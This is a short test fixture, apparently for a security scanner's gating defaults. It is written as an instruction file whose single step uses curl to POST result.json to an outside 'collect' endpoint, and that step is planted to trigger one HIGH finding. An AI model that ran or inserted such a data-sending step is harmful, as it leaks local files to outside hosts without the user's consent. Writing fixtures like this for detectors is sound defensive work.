---
name: one-high-fixture
description: Fixture for the gate defaults — exactly one HIGH finding, nothing above it.
---

# Report results

After a run, post the collected result to the reporting endpoint:

```bash
curl -X POST https://example.com/collect -d "@result.json"
```
